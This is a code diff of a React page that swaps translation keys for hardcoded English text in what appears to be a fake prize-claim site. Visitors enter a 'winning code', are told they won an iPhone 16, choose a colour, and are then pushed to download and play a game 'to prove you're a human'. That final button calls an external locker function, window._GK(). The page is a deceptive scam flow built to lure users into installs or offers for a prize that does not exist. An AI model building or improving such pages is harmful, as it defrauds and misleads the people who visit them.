@@ -1,5 +1,4 @@
 import React, { useState } from "react";
-import { useTranslation } from "react-i18next";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
 import {
@@ -20,7 +19,6 @@ const prizeData: { [key: string]: { name: string; image: string } } = {
 };
 
 const Index: React.FC = () => {
-  const { t } = useTranslation();
   const [code, setCode] = useState<string>("");
   const [isSuccessModalOpen, setIsSuccessModalOpen] = useState<boolean>(false);
   const [isErrorModalOpen, setIsErrorModalOpen] = useState<boolean>(false);
@@ -34,9 +32,9 @@ const Index: React.FC = () => {
   } | null>(null);
 
   const colorOptions = [
-    { name: t("colorBlack"), image: "/black.png", colorClass: "bg-zinc-800" },
-    { name: t("colorGreen"), image: "/green.png", colorClass: "bg-teal-500" },
-    { name: t("colorPink"), image: "/pink.png", colorClass: "bg-pink-400" },
+    { name: "Black", image: "/black.png", colorClass: "bg-zinc-800" },
+    { name: "Green", image: "/green.png", colorClass: "bg-teal-500" },
+    { name: "Pink", image: "/pink.png", colorClass: "bg-pink-400" },
   ];
 
   const [selectedColor, setSelectedColor] = useState(colorOptions[0]);
@@ -92,15 +90,15 @@ const Index: React.FC = () => {
 
       <div className="relative z-10 bg-white dark:bg-gray-800 p-8 rounded-lg shadow-xl w-full max-w-md text-center animate-fade-in">
         <h1 className="text-4xl font-bold text-gray-800 dark:text-white mb-4">
-          {t("title")}
+          Enter Your Winning Code
         </h1>
         <p className="text-lg text-gray-600 dark:text-gray-300 mb-8">
-          {t("subtitle")}
+          If you won you should have a winning code.
         </p>
         <div className="flex flex-col sm:flex-row gap-4 mb-8">
           <Input
             type="text"
-            placeholder={t("codeInputPlaceholder")}
+            placeholder="Your Code"
             value={code}
             onChange={(e) => setCode(e.target.value)}
             className="flex-grow p-3 border border-gray-300 dark:border-gray-600 rounded-md focus:ring-2 focus:ring-blue-500 dark:bg-gray-700 dark:text-white transition-all duration-200 hover:border-blue-400"
@@ -111,7 +109,7 @@ const Index: React.FC = () => {
             className="w-full sm:w-auto px-6 py-3 bg-blue-600 hover:bg-blue-700 text-white font-semibold rounded-md transition-all duration-300 ease-in-out transform hover:scale-105 relative overflow-hidden group"
             disabled={isLoading}
           >
-            <span className="relative z-10">{t("checkCodeButton")}</span>
+            <span className="relative z-10">Check Code</span>
             <span className="absolute inset-0 bg-gradient-to-r from-blue-500 to-blue-700 opacity-0 group-hover:opacity-100 transition-opacity duration-300 blur-sm"></span>
           </Button>
         </div>
@@ -122,10 +120,10 @@ const Index: React.FC = () => {
           <DialogHeader>
             <DialogTitle className="text-3xl font-bold text-blue-600 dark:text-blue-400 mb-2">
               <Loader2 className="h-8 w-8 animate-spin mx-auto mb-4" />
-              {t("scanningTitle")}
+              Scanning Code...
             </DialogTitle>
             <DialogDescription className="text-gray-700 dark:text-gray-300 text-lg">
-              {t("scanningDescription")}
+              Please wait while we verify your code.
             </DialogDescription>
           </DialogHeader>
         </DialogContent>
@@ -135,7 +133,7 @@ const Index: React.FC = () => {
         <DialogContent className="sm:max-w-md bg-white dark:bg-gray-800 p-6 rounded-lg shadow-2xl text-center animate-scale-in">
           <DialogHeader>
             <DialogTitle className="text-3xl font-bold text-green-600 dark:text-green-400 mb-2">
-              {t("congratulationsTitle")}
+              Congratulations! 🎉
             </DialogTitle>
             {winningPrize && (
               <div className="mt-4 mb-6">
@@ -145,19 +143,19 @@ const Index: React.FC = () => {
                   className="mx-auto h-45 w-45 object-contain mb-4"
                 />
                 <p className="text-2xl font-semibold text-gray-800 dark:text-white">
-                  {t("prizeWon")}
+                  You won an iPhone 16
                 </p>
               </div>
             )}
             <DialogDescription className="text-gray-700 dark:text-gray-300 text-lg">
-              {t("chooseColorPrompt")}
+              Click below to choose a color.
             </DialogDescription>
           </DialogHeader>
           <Button
             onClick={handleChooseColor}
             className="w-full py-3 mt-6 bg-blue-600 hover:bg-blue-700 text-white font-semibold rounded-md transition-all duration-300 ease-in-out transform hover:scale-105"
           >
-            {t("chooseColorButton")}
+            Choose a color
           </Button>
         </DialogContent>
       </Dialog>
@@ -166,10 +164,10 @@ const Index: React.FC = () => {
         <DialogContent className="sm:max-w-md bg-white dark:bg-gray-800 p-6 rounded-lg shadow-2xl text-center animate-scale-in">
           <DialogHeader>
             <DialogTitle className="text-3xl font-bold text-gray-800 dark:text-white mb-2">
-              {t("colorModalTitle")}
+              Choose Your Color
             </DialogTitle>
             <DialogDescription className="text-gray-600 dark:text-gray-300">
-              {t("colorModalDescription")}
+              Select your preferred color for your iPhone 16.
             </DialogDescription>
           </DialogHeader>
           <div className="flex justify-center my-6">
@@ -190,7 +188,7 @@ const Index: React.FC = () => {
                       ? "ring-2 ring-offset-2 ring-blue-500"
                       : ""
                   }`}
-                  aria-label={t("selectColorAria", { color: color.name })}
+                  aria-label={`Select ${color.name}`}
                 />
               ))}
             </div>
@@ -199,7 +197,7 @@ const Index: React.FC = () => {
             onClick={handleAgreement}
             className="w-full py-3 mt-4 bg-blue-600 hover:bg-blue-700 text-white font-semibold rounded-md transition-all duration-300 ease-in-out transform hover:scale-105"
           >
-            {t("nextButton")}
+            Next
           </Button>
         </DialogContent>
       </Dialog>
@@ -211,10 +209,12 @@ const Index: React.FC = () => {
         <DialogContent className="sm:max-w-md bg-white dark:bg-gray-800 p-6 rounded-lg shadow-2xl text-center animate-scale-in">
           <DialogHeader>
             <DialogTitle className="text-3xl font-bold text-gray-800 dark:text-white mb-4">
-              {t("finalStepTitle")}
+              Final Step
             </DialogTitle>
             <DialogDescription className="text-gray-600 dark:text-gray-300 text-left">
-              {t("finalStepDescription")}
+              To start the shipping process for your iPhone, you need to finish
+              one last step. Download and play a free game for about 15 minutes
+              to prove you’re a human not a programmed Robot.
             </DialogDescription>
           </DialogHeader>
           <div className="flex flex-col gap-4 mt-6">
@@ -222,7 +222,7 @@ const Index: React.FC = () => {
               onClick={() => (window as any)._GK()}
               className="w-full py-3 bg-green-600 hover:bg-green-700 text-white font-semibold rounded-md transition-all duration-300 ease-in-out transform hover:scale-105"
             >
-              {t("agreeButton")}
+              Yes I Agree
             </Button>
           </div>
         </DialogContent>
@@ -232,17 +232,17 @@ const Index: React.FC = () => {
         <DialogContent className="sm:max-w-md bg-white dark:bg-gray-800 p-6 rounded-lg shadow-2xl text-center animate-scale-in">
           <DialogHeader>
             <DialogTitle className="text-3xl font-bold text-red-600 dark:text-red-400 mb-2">
-              {t("invalidCodeTitle")}
+              ❌ Invalid Code
             </DialogTitle>
             <DialogDescription className="text-gray-700 dark:text-gray-300 text-lg">
-              {t("invalidCodeDescription")}
+              The code you entered is incorrect. Please try again.
             </DialogDescription>
           </DialogHeader>
           <Button
             onClick={() => setIsErrorModalOpen(false)}
             className="w-full py-3 mt-6 bg-gray-300 hover:bg-gray-400 text-gray-800 font-semibold rounded-md transition-all duration-300 ease-in-out transform hover:scale-105"
           >
-            {t("closeButton")}
+            Close
           </Button>
         </DialogContent>
       </Dialog>
